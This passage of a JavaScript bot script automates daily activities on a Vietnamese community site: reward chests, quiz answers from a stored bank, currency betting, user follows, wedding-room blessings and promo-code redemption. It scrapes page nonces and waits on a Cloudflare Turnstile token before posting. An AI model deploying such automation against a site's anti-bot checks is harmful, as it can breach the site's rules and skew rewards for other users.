            console.log(`🔴 [Luận Võ] - Lỗi "triggerFollow": ${error.message}`)
        }
    }

    async triggerUnfollow(ids, variableJSON = null) {
        try {
            await this.loadPageIfNeeded()
            if (variableJSON === null) variableJSON = parseVariableJSON(this.page.doc, 'luan-vo-main-js-extra', 'LuanVoConfig')
            if (!variableJSON.nonce) return console.log(`🔴 [Luận Võ] - Không tìm thấy nonce unfollow`)
            const currentId = parseInt(variableJSON.current_user_id)
            for (let id of ids) {
                if (id === currentId) continue
                const result = await postRequest(LUANVO_URL + '/unfollow', {
                    headers: { 'Content-Type': 'application/json', 'x-wp-nonce': variableJSON.nonce },
                    body: JSON.stringify({ unfollow_user_id: id })
                })
                const message = result?.success === true
                    ? `✅ [Luận Võ] - Hủy theo dõi thành công ID: ${id}`
                    : `❌ [Luận Võ] - Hủy theo dõi thất bại ID: ${id}`
                logger.log(message)
            }
            logger.log(`🟢 [Luận Võ] - Hoàn thành xử lý hủy theo dõi.`)
        } catch (error) {
            console.log(`🔴 [Luận Võ] - Lỗi "triggerUnfollow": ${error.message}`)
        }
    }
}

class PhucLoiDuong {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/phuc-loi-duong')
            await this.claimBonusReward(page)
            const security = page.html.match(/get_next_time_pl[\s\S]*?security\s*:\s*'([^']+)'/)?.[1]
            const next = await this.getNextTime(security)
            if (next === null) return
            await this.openChest(security, next)
        } catch (error) {
            console.log(`🔴 [Phúc Lợi Đường] - Lỗi "trigger": ${error.message}`)
        }
    }

    async claimBonusReward(page) {
        async function claimRequest(id, security) {
            const result = await postRequest(HH3D_AJAX_URL, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ action: 'claim_bonus_reward', chest_id: id, security })
            })
            logger.log(`${result?.success === true ? '✅' : '❌'} [Phúc Lợi Đường] - ${result?.data?.message || result}`)
            return !!result?.success
        }

        if (!page) page = await loadPage(DOMAIN + '/phuc-loi-duong')
        const ids = Array.from(page.doc.querySelectorAll('.reward-progress-container .milestone'))
            .map(milestone => {
                const giftBox = milestone.querySelector('.gift-box')
                if (!giftBox) return null
                const classList = giftBox.classList
                const isActive = classList.contains('active')
                const isReceived = classList.contains('received-reward')
                const pointerEvents = (giftBox.getAttribute('style') || '').match(/pointer-events\s*:\s*([a-zA-Z-]+)/)
                const pointerValue = pointerEvents?.[1]?.trim()
                return (isActive && !isReceived && (!pointerValue || pointerValue === 'auto'))
                    ? milestone.getAttribute('data-id')
                    : null
            })
            .filter(Boolean)
        const requestData = parseRequestData(page.html)
        const security = requestData.find(value => value.action === 'claim_bonus_reward')?.security
        if (!security) return console.log(`🔴 [Phúc Lợi Đường] - Không tìm thấy security claim_bonus_reward.`)
        for (const id of ids) {
            if (await claimRequest(id, security) && Number(id) === 3) {
                return await claimRequest(4, security)
            }
        }
    }

    async getNextTime(security) {
        if (!security) return console.log(`🔴 [Phúc Lợi Đường] - Không tìm thấy security get_next_time_pl`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'get_next_time_pl', security })
        })
        const level = parseInt(result?.data?.chest_level, 10)
        const time = result?.data?.time
        if (result?.success === true && !isNaN(level)) {
            if (level === 4) {
                logger.log(`🟢 [Phúc Lợi Đường] - Đã mở đủ 4 rương.`)
            } else if (time !== '00:00') {
                logger.log(`🟡 [Phúc Lợi Đường] - Chưa đến thời gian mở | ${time || '--'}`)
            } else {
                return level + 1
            }
        } else {
            return console.log(`🔴 [Phúc Lợi Đường] - Không lấy được dữ liệu get_next_time_pl.`)
        }
        return null
    }

    async openChest(security, next) {
        if (!security) return console.log(`🔴 [Phúc Lợi Đường] - Không tìm thấy security open_chest_pl.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'open_chest_pl', security, chest_id: next })
        })
        const message = result?.success === true
            ? `🟢 [Phúc Lợi Đường] - Rương ${next} - ${result.data?.message}`
            : `🔴 [Phúc Lợi Đường] - Không thành công - ${result?.data?.message}`
        logger.log(message)
    }
}

class DoThach {
    constructor(indices, amount = 20) {
        this.indices = indices
        this.amount = amount
    }

    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/do-thach-hh3d')
            const requestData = parseRequestData(page.html)
            const hasGift = page.doc.querySelector('.custom-button.gift-button')
            if (hasGift) await this.giveNewbieGift(requestData)
            const hasReward = page.doc.querySelector('#claim-reward-button')
            if (hasReward) {
                await this.claimDoThachReward(requestData)
                return await this.trigger()
            }
            const stones = await this.loadDoThachData(requestData)
            if (!stones.length) return
            stones.sort((lhs, rhs) => (Number(rhs.reward_multiplier) || 0) - (Number(lhs.reward_multiplier) || 0))
            const placedStones = stones.filter(stone => stone.bet_placed === true)
            const remainingStones = stones.filter((_, index) => this.indices.includes(index + 1) && !placedStones.includes(stones[index]))
            const targetStones = placedStones.concat(remainingStones).slice(0, 2)
            for (const stone of targetStones) {
                if (stone.bet_placed === true) {
                    logger.log(`✅ [Đổ Thạch] - Đã đặt cược vào ${stone.name} (x${stone.reward_multiplier})`)
                } else {
                    await this.placeDoThachBet(requestData, stone, this.amount)
                }
            }
        } catch (error) {
            console.log(`🔴 [Đổ Thạch] - Lỗi "trigger": ${error.message}`)
        }
    }

    async giveNewbieGift(requestData) {
        const security = requestData.find(value => value.action === 'give_newbie_gift')?.security
        if (!security) return console.log(`🔴 [Đổ Thạch] - Không tìm thấy security give_newbie_gift.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'give_newbie_gift', security })
        })
        const message = result?.success === true
            ? `🟢 [Đổ Thạch] - Nhận quà tân thủ thành công`
            : `🔴 [Đổ Thạch] - Nhận quà tân thủ thất bại - ${result?.data || result}`
        logger.log(message)
    }

    async claimDoThachReward(requestData) {
        const security = requestData.find(value => value.action === 'claim_do_thach_reward')?.security
        if (!security) return console.log(`🔴 [Đổ Thạch] - Không tìm thấy security claim_do_thach_reward.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'claim_do_thach_reward', security })
        })
        const message = result?.success === true
            ? `🟢 [Đổ Thạch] - Nhận thưởng thành công - ${result?.data?.message}`
            : `🔴 [Đổ Thạch] - ${result?.data?.message || result}`
        logger.log(message)
    }

    async loadDoThachData(requestData) {
        const security = requestData.find(value => value.action === 'load_do_thach_data')?.security
        if (!security) return console.log(`🔴 [Đổ Thạch] - Không tìm thấy security load_do_thach_data.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'load_do_thach_data', security })
        })
        const { success, data } = result || {}
        const { stones, is_reward_time, winning_stone_id } = data || {}
        if (!success || !stones) {
            console.log(`🔴 [Đổ Thạch] - Không lấy được dữ liệu load_do_thach_data.`)
            return []
        }
        if (!is_reward_time) return stones
        const sample = {
            stones: stones.map(({ stone_id, name, reward_multiplier, bet_count }) => ({
                stone_id,
                name,
                reward_multiplier,
                bet_count: Number(bet_count)
            })),
            winning_stone_id
        }
        console.log(JSON.stringify(sample, null, 4))
        const rewardStone = stones.find(stone => stone.stone_id == winning_stone_id && stone.bet_placed === true)
        if (!rewardStone) {
            logger.log(`🟡 [Đổ Thạch] - Không có thưởng.`)
            return []
        }
        if (rewardStone.reward_claimed === true) {
            logger.log(`🟢 [Đổ Thạch] - Đã nhận thưởng.`)
            return []
        }
        await this.claimDoThachReward(requestData)
        return []
    }

    async placeDoThachBet(requestData, stone) {
        const security = requestData.find(value => value.action === 'place_do_thach_bet')?.security
        if (!security) return console.log(`🔴 [Đổ Thạch] - Không tìm thấy security place_do_thach_bet`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'place_do_thach_bet', security, stone_id: stone.stone_id, bet_amount: this.amount })
        })
        const message = result?.success === true
            ? `🟢 [Đổ Thạch] - Đặt cược thành công - ${stone.name} (x${stone.reward_multiplier}) - ${this.amount} Tiên Ngọc`
            : `🔴 [Đổ Thạch] - Đặt cược thất bại - ${result?.data || result}`
        logger.log(message)
    }
}

class ThiLuyenTongMon {
    async trigger() {
        try {
            const page = await loadPage(DOMAIN + '/thi-luyen-tong-mon-hh3d')
            const security = page.html.match(/get_remaining_time_tltm[\s\S]*?security\s*:\s*'([^']+)'/)?.[1]
            const next = await this.getRemainingTimeTLTM(security)
            if (next === null) return
            if (!security) return console.log(`🔴 [Thí Luyện Tông Môn] - Không tìm thấy security open_chest_tltm.`)
            const result = await postRequest(HH3D_AJAX_URL, {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ action: 'open_chest_tltm', security })
            })
            const message = result?.success === true
                ? `🟢 [Thí Luyện Tông Môn] - Mở thành công - ${result.data?.message}`
                : `🟡 [Thí Luyện Tông Môn] - ${result.data?.message}`
            logger.log(message)
        } catch (error) {
            console.log(`🔴 [Thí Luyện Tông Môn] - Lỗi "trigger": ${error.message}`)
        }
    }

    async getRemainingTimeTLTM(security) {
        if (!security) return console.log(`🔴 [Thí Luyện Tông Môn] - Không tìm thấy security get_remaining_time_tltm`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'get_remaining_time_tltm', security })
        })

        const time = result.data?.time_remaining
        if (result?.success === true) {
            if (time !== '00:00') {
                logger.log(`🟡 [Thí Luyện Tông Môn] - Chưa đến thời gian mở | ${time}`)
            } else {
                return time
            }
        } else {
            console.log(`🔴 [Thí Luyện Tông Môn] - Không lấy được dữ liệu get_remaining_time_tltm`)
        }
        return null
    }
}

class VanDap {
    async trigger() {
        try {
            const bank = Object.fromEntries(
                Object.entries(quizBank).map(([key, value]) => [normalize(key), value])
            )
            const questions = await this.loadQuizData()
            if (!questions.length) return
            for (const [index, value] of questions.entries()) {
                const correct = parseInt(value.is_correct, 10) || 0
                if (correct === 1) {
                    logger.log(`✅ [Vấn Đáp] - Câu ${index + 1} ➤ Đúng`)
                } else if (correct === 2) {
                    logger.log(`❌ [Vấn Đáp] - Câu ${index + 1} ➤ Sai`)
                } else {
                    const question = normalize(value.question)
                    const answer = bank[question] ?? ''
                    const options = value.options.map(option => typeof option === 'string' ? option : option.content)
                    const answerIndex = Math.max(0, Math.min(3, bestMatch(options, answer).bestIndex))
                    await this.saveQuizResult(value.id, answerIndex, index)
                }
            }
            logger.log(`🟢 [Vấn Đáp] - Hoàn thành.`)
        } catch (error) {
            console.log(`🔴 [Vấn Đáp] - Lỗi "trigger": ${error.message}`)
        }
    }

    async loadQuizData() {
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'load_quiz_data' })
        })
        const { success, data = {} } = result || {}
        const { questions = [], completed } = data || {}
        if (!success || !questions.length) {
            console.log('🔴 [Vấn Đáp] - Không lấy được dữ liệu load_quiz_data.')
            return []
        }
        if (completed) {
            logger.log('🟢 [Vấn Đáp] - Đã hoàn thành.')
            return []
        }
        return questions
    }

    async saveQuizResult(id, answer, index) {
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'save_quiz_result', question_id: id, answer: answer })
        })
        if (result?.success === true) {
            const message = parseInt(result.data?.is_correct, 10) === 1
                ? `✅ [Vấn Đáp] - Câu ${index + 1} ➤ Đúng`
                : `❌ [Vấn Đáp] - Câu ${index + 1} ➤ Sai`
            logger.log(message)
        } else {
            logger.log(`⚠️ [Vấn Đáp] - Chưa trả lời câu ${index + 1}.`)
        }
    }
}

class TienDuyen {
    async scheduleBlessing({ items = [], delay = 0, immediately = false, tab = null }) {
        try {
            const now = new Date()
            let pastIds = []
            const futureItems = []
            for (const item of items) {
                const { id, time } = item
                const [hour, minute] = time.split(':').map(Number)
                const target = new Date()
                target.setHours(hour, minute, delay, 0)
                const wait = target - now
                if (wait < 0) {
                    pastIds.push(id)
                } else {
                    futureItems.push({ id, time, wait })
                }
            }
            if (pastIds.length) {
                if (immediately) {
                    await this.scanBlessing(tab, false)
                } else {
                    logger.log(`⏭️ [Tiên Duyên] - Đã quá giờ - Bỏ qua phòng cưới ${pastIds}.`)
                }
            }
            futureItems.sort((lhs, rhs) => lhs.wait - rhs.wait)
            let lastTime = Date.now()
            for (const item of futureItems) {
                const { id, time, wait } = item
                const nowTime = Date.now()
                const waitTime = Math.max(wait - (nowTime - lastTime), 0)
                const hours = Math.floor(waitTime / 3600000)
                const minutes = Math.floor((waitTime % 3600000) / 60000)
                const seconds = Math.floor((waitTime % 60000) / 1000)
                logger.log(`⏳ [Tiên Duyên] - Chúc phúc phòng cưới ${id} lúc ${time} sẽ chạy sau ${hours} giờ ${minutes} phút ${seconds} giây.`)
                await sleep(waitTime)
                await this.triggerBlessing({ id, tab })
                lastTime = Date.now()
            }
            if (tab && !tab.closed) tab.close()
        } catch (error) {
            console.log(`🔴 [Tiên Duyên] - Lỗi "scheduleBlessing": ${error.message}`)
        }
    }

    async scanBlessing(tab = null, claimLiXi = true) {
        try {
            const rooms = await this.getAllWeddings()
            for (const room of rooms) {
                if (room.has_blessed !== true) {
                    logger.log(`⚠️ [Tiên Duyên] - Chưa chúc phúc phòng cưới ${room.wedding_room_id}.`)
                    await this.triggerBlessing({ id: room.wedding_room_id, tab })
                } else if (room.has_sent_li_xi === true) {
                    if (claimLiXi) await this.claimLiXi(room.wedding_room_id)
                } else {
                    logger.log(`⚠️ [Tiên Duyên] - phòng cưới ${room.wedding_room_id} chưa phát Lì Xì.`)
                }
            }
            const message = rooms.length
                ? '🟢 [Tiên Duyên] - Đã quét xong.'
                : '🟡 [Tiên Duyên] - Không có phòng cưới nào.'
            logger.log(message)
        } catch (error) {
            console.log(`🔴 [Tiên Duyên] - Lỗi "scanBlessing": ${error.message}`)
        }
    }

    async triggerBlessing({ id, tab, retries = 5, delay = 10000, timeout = 15000 }) {
        const retry = async (reason = '') => {
            if (reason) logger.log(`↪️ [Tiên Duyên] - ${reason} ➤ Thử lại còn ${retries - 1} lần...`)
            if (tab && !tab.closed) tab.location.replace('about:blank')
            retries--
            await sleep(delay)
        }

        while (retries > 0) {
            const targetURLString = `${DOMAIN}/phong-cuoi?id=${id}`
            if (!tab || tab.closed) {
                const page = await loadPage(targetURLString)
                if (await this.sendBlessing(id, null, page.doc)) return
                await retry(`Chúc phúc phòng cưới ${id} thất bại`)
                continue
            }
            tab.location.replace(targetURLString)
            await sleep(250)
            await new Promise(resolve => {
                const interval = setInterval(() => {
                    if (tab.location.href === targetURLString) {
                        clearInterval(interval)
                        resolve()
                    }
                }, 500)
                setTimeout(() => {
                    clearInterval(interval)
                    resolve(false)
                }, timeout)
            })
            try {
                const loaded = await this.waitForPage(id, tab, timeout)
                if (!loaded) {
                    await retry(`Không tải được trang phòng cưới ${id}`)
                    continue
                }
                if (tab.document.title.trim() === 'Phòng Cưới Không Tồn Tại') {
                    await retry(`Phòng cưới ${id} chưa mở`)
                    continue
                }
                if (tab.document.querySelector('.blessing-message')) {
                    tab.location.replace('about:blank')
                    return logger.log(`🟢 [Tiên Duyên] - Đã chúc phúc phòng cưới ${id}.`)
                }
                const token = await this.waitForCFTurnstile(tab, timeout)
                if (token === '') {
                    await retry(`Xác thực CF phòng cưới ${id} thất bại`)
                    continue
                }
                const success = await this.sendBlessing(id, token, tab.document)
                if (success) return tab.location.replace('about:blank')
                await retry(`Chúc phúc phòng cưới ${id} thất bại`)
            } catch (error) {
                await retry(`Lỗi xử lý trang phòng cưới ${id}: ${error.message || error}`)
            }
        }
        console.log(`🔴 [Tiên Duyên] - Chúc phúc phòng cưới ${id} thất bại sau nhiều lần.`)
    }

    async waitForPage(id, tab, timeout = 15000) {
        return new Promise(resolve => {
            const interval = setInterval(() => {
                try {
                    if (tab.document && tab.document.readyState === 'complete') {
                        clearInterval(interval)
                        resolve(true)
                    }
                } catch (error) {
                    console.log(`🔴 [Tiên Duyên] - Lỗi truy cập thông tin phòng cưới ${id}: ${error}`)
                    clearInterval(interval)
                    resolve(false)
                }
            }, 500)
            setTimeout(() => {
                clearInterval(interval)
                resolve(false)
            }, timeout)
        })
    }

    async waitForCFTurnstile(tab, timeout = 15000) {
        const observeValueChange = (input) => {
            return new Promise(resolve => {
                const observer = new MutationObserver(() => {
                    if (input.value && input.value.trim() !== '') {
                        observer.disconnect()
                        resolve(input.value)
                    }
                })
                observer.observe(input, { attributes: true, attributeFilter: ['value'] })
                setTimeout(() => {
                    observer.disconnect()
                    resolve('')
                }, timeout)
            })
        }

        const input = tab.document.querySelector('#cf-turnstile-response')
        if (!input) return null
        if (input.value && input.value.trim() !== '') return input.value
        return await observeValueChange(input)
    }

    async getAllWeddings() {
        const page = await loadPage(DOMAIN + '/tien-duyen')
        const variableJSON = parseVariableJSON(page.doc, 'better-messages-js-extra', 'Better_Messages')
        const nonce = variableJSON.nonce
        if (!nonce) {
            console.log(`🔴 [Tiên Duyên] - Không tìm thấy nonce show_all_wedding.`)
            return []
        }
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce },
            body: JSON.stringify({ action: 'show_all_wedding' })
        })
        return Array.isArray(result?.data) ? result.data : []
    }

    async claimLiXi(id) {
        const page = await loadPage(DOMAIN + '/phong-cuoi?id=' + id)
        const hasLiXiModal = page.doc.getElementById('liXiModal') !== null
        if (!hasLiXiModal) return
        const restNonce = Array.from(page.doc.querySelectorAll('script'))
            .map(script => script.textContent.match(/const\s+rest_nonce\s*=\s*['"]([^'"]+)['"]/))
            .find(match => match)?.[1]
        if (!restNonce) return console.log(`🔴 [Tiên Duyên] - Không tìm thấy nonce hh3d_receive_li_xi.`)
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': restNonce },
            body: JSON.stringify({ action: 'hh3d_receive_li_xi', wedding_room_id: id })
        })
        const message = result?.success === true
            ? `✅ [Tiên Duyên] - Mở Lì Xì thành công phòng ${id} - Nhận ${result.data?.amount} ${result.data?.name}`
            : `❌ [Tiên Duyên] - Mở Lì Xì thất bại - ${result?.data?.message || result}`
        logger.log(message)
    }

    async sendBlessing(id, token, doc) {
        const restNonce = Array.from(doc.querySelectorAll('script'))
            .map(script => script.textContent.match(/const\s+rest_nonce\s*=\s*['"]([^'"]+)['"]/))
            .find(match => match)?.[1]
        if (!restNonce) {
            console.log(`🔴 [Tiên Duyên] - Không tìm thấy nonce hh3d_add_blessing.`)
            return false
        }
        const message = blessingMessages[Math.floor(Math.random() * blessingMessages.length)]
        let bodyData = { action: 'hh3d_add_blessing', wedding_room_id: id, message }
        if (token) bodyData['cf-turnstile-response'] = token
        const result = await postRequest(ACTION_URL, {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': restNonce },
            body: JSON.stringify(bodyData),
            retries: 0
        })
        if (result?.success === true) {
            logger.log(`🟢 [Tiên Duyên] - Chúc phúc thành công phòng cưới ${id}.`)
            return true
        } else {
            console.log(`🔴 [Tiên Duyên] - Chúc phúc thất bại phòng cưới ${id}:`, result?.message || result)
            return false
        }
    }
}

class TongMon {
    async triggerTeLe() {
        try {
            const page = await loadPage(DOMAIN + '/danh-sach-thanh-vien-tong-mon')
            const variableJSON = parseVariableJSON(page.doc, 'tong-mon-main-js-extra', 'TongMonConfig')
            const nonce = variableJSON.nonce
            if (await this.checkTeLeStatus(nonce)) return logger.log(`🟢 [Tế Lễ] - Đã hoàn thành.`)
            await this.teLe(nonce)
        } catch (error) {
            console.log(`🔴 [Điểm Danh] - Lỗi "trigger": ${error.message}`)
        }
    }

    async checkTeLeStatus(nonce) {
        if (!nonce) return console.log(`🔴 [Tế Lễ] - Không tìm thấy nonce check_te_le_status.`)
        const result = await postRequest(TONGMON_URL + '/check-te-le-status', {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce }
        })
        return !!result?.success
    }

    async teLe(nonce) {
        if (!nonce) return console.log(`🔴 [Tế Lễ] - Không tìm thấy nonce te_le_tong_mon.`)
        const result = await postRequest(TONGMON_URL + '/te-le-tong-mon', {
            headers: { 'Content-Type': 'application/json', 'X-WP-Nonce': nonce }
        })
        const message = result?.success === true
            ? `🟢 [Tế Lễ] - Thành công.`
            : `🟡 [Tế Lễ] - ${result?.message}`
        logger.log(message)
    }
}

class HoatDongNgay {
    async triggerReward() {
        try {
            const page = await loadPage(DOMAIN + '/bang-hoat-dong-ngay')
            const boxes = page.doc.querySelectorAll('[id^="reward-box-"]')
            let count = 0
            for (let i = 0; i < boxes.length; i++) {
                const box = boxes[i]
                const stage = i + 1
                if (box.classList.contains('claimed')) {
                    count += 1
                } else if (box.classList.contains('unlocked')) {
                    if (await this.claim(stage)) {
                        count += 1
                    }
                }
            }
            logger.log(`🟢 [Hoạt Động Ngày] - Đã nhận ${count} rương thưởng.`)
        } catch (error) {
            console.log(`🔴 [Hoạt Động Ngày] - Lỗi "trigger": ${error.message}`)
        }
    }

    async claim(stage) {
        const result = await postRequest(ADMIN_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'daily_activity_reward', stage: 'stage' + stage })
        })
        const message = result?.success === true
            ? `✅ [Hoạt Động Ngày] - Nhận thành công - Rương ${stage}.`
            : `❌ [Hoạt Động Ngày] - Nhận thất bại - Rương${result?.data?.message || result}.`
        logger.log(message)
        return !!result?.success
    }
}

class LinhThach {
    constructor(codes) {
        this.codes = codes
    }

    async trigger() {
        try {
            for (const code of this.codes) {
                await this.redeemLinhThach(code)
            }
            logger.log(`🟢 [Linh Thạch] - Đã nhập xong`)
        } catch (error) {
            console.log(`🔴 [Linh Thạch] - Lỗi "trigger": ${error.message}`)
        }
    }

    async redeemLinhThach(code) {
        const page = await loadPage(DOMAIN + '/linh-thach')
        const nonce = page.html.match(/'nonce'\s*:\s*'([a-f0-9]+)'/i)?.[1]
        if (!nonce) return console.log(`🔴 [Linh Thạch] - Không tìm thấy nonce redeem_linh_thach.`)
        const result = await postRequest(HH3D_AJAX_URL, {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams({ action: 'redeem_linh_thach', code, nonce, hold_timestamp: Math.floor(Date.now() / 1000) })
        })
        const message = result?.success === true
            ? `✅ [Linh Thạch] - ${code} - ${result.data?.message || result.data}`
            : `⚠️ [Linh Thạch] - ${code} - ${result?.data?.message || result}`
        logger.log(message)
    }
}

// Danh sách các nhiệm vụ cần thực hiện.
// ➤ Nếu muốn chạy nhiệm vụ nào, chỉ cần thêm ID tương ứng vào mảng `tasks`.
// ➤ Ví dụ: tasks = [1, 4] - Chạy các hoạt động Điểm Danh, Vấn Đáp, Tế Lễ và Phúc Lợi.
// ➤ Ví dụ: tasks = [0, 2] - Chạy các hoạt động Tiên Duyên, Đổ Thạch.
// Danh sách nhiệm vụ:
//  0 - Tiên Duyên
//  1 - Điểm Danh - Vấn Đáp - Tế Lễ
//  2 - Đổ Thạch
//  3 - Thí Luyện Tông Môn
//  4 - Phúc Lợi
//  5 - Hoang Vực
// 10 - Luận Võ - Gửi Khiêu Chiến
const tasks = []

// Nhận Lì Xì nếu có (true hoặc false).
// ➤ blessingLiXi = true: Chúc phúc Tiên Duyên + Nhận Lì Xì.
// ➤ blessingLiXi = false: Chỉ chúc phúc Tiên Duyên + Không nhận Lì Xì.
const blessingLiXi = true

// Loại đá bạn muốn cược trong Đổ Thạch - Từ 1 đến 6 (number).
// ➤ Nếu muốn thay đổi loại đá để cược, chỉ cần chỉnh lại các con số trong mảng `bets`.
// ➤ Ví dụ: bets = [1, 4] - Cược vào 2 loại đá có tỉ lệ thưởng cao thứ 1 và thứ 4.
const bets = [1, 2]

// Tự động nhận khiêu chiến trong Luận Võ (true hoặc false).
// ➤ battleAutoOn = true: Bật tự động nhận khiêu chiến.
// ➤ battleAutoOn = false: Tắt tự động nhận khiêu chiến.
const battleAutoOn = true

// Tùy chọn gửi khiêu chiến trong Luận Võ - `online` (true hoặc false) - `retries` (number).
// ➤ online: false = Không tự động tìm đánh người Online khi lượt gửi người Theo dõi chưa đạt tối đa.
// ➤ online: true = Tự động tìm đánh người Online khi lượt gửi người Theo dõi chưa đạt tối đa.
// ➤ retries: 3 = Số lần tải lại danh sách người Online.
const battleOptions = { online: true, retries: 3 }

// Danh sách code cần nhập trong Linh Thạch (text).
// ➤ Ví dụ: codes = ["19THANG5", "HOATHINH3DSITE"] hoặc codes = ['19THANG5', 'HOATHINH3DSITE']
const codes = ["EMLAEMBEEMMUONDUOCQUA", "CODEBAOTRI ","HOATHINH3D3001A", "HOATHINH3D3001B","HOATHINH3D4001A ","HOATHINH3D4001B ","HOATHINH3D6001A ", "HOATHINH3D6001B ","HOATHINH3D9001A","HOATHINH3D9001B ","HOATHINH3D13001A ","HOATHINH3D13001B ", "HOATHINH3D19001A ", "HOATHINH3D19001B "]

{
    (async () => {
        
        if (codes.length) {
            const linhthach = new LinhThach(codes)
            await linhthach.trigger()
        }
        if (tasks.includes(0)) {
            const tienduyen = new TienDuyen()
            await tienduyen.scanBlessing(null, blessingLiXi)
        }
        if (tasks.includes(1)) {
            const diemdanh = new DiemDanh()
            await diemdanh.trigger()

            const vandap = new VanDap()
            await vandap.trigger()

            const tongmon = new TongMon()
            await tongmon.triggerTeLe()
        }
        if (tasks.includes(2)) {
            const dothach = new DoThach(bets)
            await dothach.trigger()
        }
        if (tasks.includes(3)) {
            const thiluyen = new ThiLuyenTongMon()
            await thiluyen.trigger()
        }
        if (tasks.includes(4)) {
            const phucloiduong = new PhucLoiDuong()
            await phucloiduong.trigger()
        }
        if (tasks.includes(5)) {
            const hoangvuc = new HoangVuc()
            await hoangvuc.trigger()
        }

        const luanvo = new LuanVo()
        if (tasks.includes(10)) {
            await luanvo.triggerReceive(battleAutoOn)
            await luanvo.triggerSend(battleOptions)
        }
        await luanvo.triggerReceive(battleAutoOn)

        const hoatdongngay = new HoatDongNgay()
        await hoatdongngay.triggerReward()

        logger.log('©Thích Bốn Lù Ngon Thơm Ngọt Nước Trắng Hồng')
        logger.log('©Tủn Đẹp Trai')
    })()}
})();
